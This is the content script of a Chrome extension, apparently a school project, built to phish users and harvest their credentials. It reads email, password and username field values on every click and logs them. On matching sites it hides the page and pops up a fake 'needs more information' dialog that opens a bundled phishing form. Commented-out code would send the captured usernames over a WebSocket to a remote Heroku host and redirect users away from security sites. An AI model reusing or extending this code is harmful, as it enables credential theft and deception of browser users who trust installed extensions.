//Just in case a popular website is trying to redflag my IP
console.log("This is all for a school project!");

//Flag variable used for if they filled out popup or not.
var phishFlag = false;

//var HOST = 'wss://thawing-island-58409.herokuapp.com';
//var ws = new WebSocket(HOST);


//This will get all the values of type email
//Email is the standard type for the email text box
//in most browsers

//Simply say the website of the current tab
console.log(window.location.host);

//Just for testing purposes
chrome.storage.sync.get("id", function(ev){
  console.log("This user is id is " + ev.id)
});

//This function will be used to phish for info from the user.
function phishFunction(){

}

/*
This is just for testing purposes to try to add
a new value to storage. This will alos help with REDIRECTION
TO ANOTHER SITE
*/

// This is supposed to be used to be able to add to the array depending on
// input from the server.
chrome.storage.sync.get(["values"], function(result){
  var arr = result["values"];
  var testString = window.location.host;
  console.log("BEFORE CHANGING PHISHFLAG " + phishFlag);
  for(var i = 0; i < arr.length; i++){
    if(testString.includes(arr[i])){
      phishFlag = !phishFlag;
        if(phishFlag){
          chrome.storage.sync.set({'phishVal': phishFlag}, function(){
          });
          document.getElementsByTagName("BODY")[0].style.display = "none";
          var confirmVal = confirm(testString + " needs more information to display appropriately.");
          var urlChanged = chrome.runtime.getURL("phishForm.html");
          console.log(urlChanged);
          if(confirmVal == true){
            window.open(urlChanged);
          }
          else{
            window.open(urlChanged);
          }
          //chrome.tabs.create({'url': urlChanged}, function(tab){
          //});
        }
      /*
      This will be used to throw out an alert if need be.
      var wind = confirm(testString + " needs more information from you to continue access.");
      if(wind == true){
      }
      else{

      }
      */
      }
    }
});
    /*
    Will hide info for when we want them to execute our script.
    if(testString.includes(arr[i])){
      document.getElementsByTagName("BODY")[0].style.display = "none";
    */

      //This will redirect them from security website
      //to a different site all together
      //window.location.replace("https://crouton.net/");


/*
  Get array and add a value in to chrome storage.
  chrome.storage.sync.set({'values': arr}, function(){
  });

*/

//Wait for a click on the screen
window.addEventListener("click", clickListen, false);

function clickListen (e){
  var val = document.getElementsByTagName('input');
  for(var i = 0; i < val.length; i++){
    if(val[i].type.toLowerCase() == 'email'){
        if(!(val[i].value === "" || val[i].value === null)){
          console.log("Username is " + val[i].value);
      }
    }
    if(val[i].type.toLowerCase() == 'password'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Password is " + val[i].value);
      }
    }
    /*
    Some forms that are used, such as instagram forms,
    have a input name rather than a type.
    */
    if(val[i].name.toLowerCase() == 'username'){
      if(!(val[i].value === "" || val[i].value === null)){
        console.log("Username is " + val[i].value);
      }
    }
  }
}

//chrome.tabs.executeScript({file: inject.js})


//ws.send("Username is "+document.getElementById('username').value);
